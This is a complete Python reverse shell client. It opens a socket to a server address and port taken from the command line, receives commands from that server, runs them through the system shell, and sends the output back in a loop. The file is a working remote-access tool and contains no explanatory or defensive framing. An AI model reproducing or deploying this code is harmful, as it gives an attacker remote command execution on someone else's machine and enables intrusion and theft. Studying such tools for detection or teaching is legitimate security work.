import socket
import sys
import subprocess
import os

host = sys.argv[1] if len(sys.argv) > 1 else '0.0.0.0' #server IP
port = int(sys.argv[2] if len (sys.argv) > 2 else 5555) # port we're tunneling data into

#create socket object 
client = socket.socket()
client.connect((host,port)) #connect to server address
data = client.recv(1024).decode()
print('[*] Server: ', data)

#loop used as a shell
while True:
	cmd = client.recv(1024).decode() #receive the command
	print(f'[*] Receive: {cmd}')

	if cmd[:2] == 'cd':
		os.chdir(cmd[3:])

	quit = ['q', 'quit', 'x', 'exit']
	#allow user to quit
	if cmd.lower() in quit:
		break
	try:
		result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True) #run the command
	except Exception as e:
		result = str(e).encode()

	#Send reassurance to the server that connection is still active if command has no output
	if len(result) == 0:
		result = 'No output.'.encode()
    #Send the output to the server
	client.send(result)

client.close()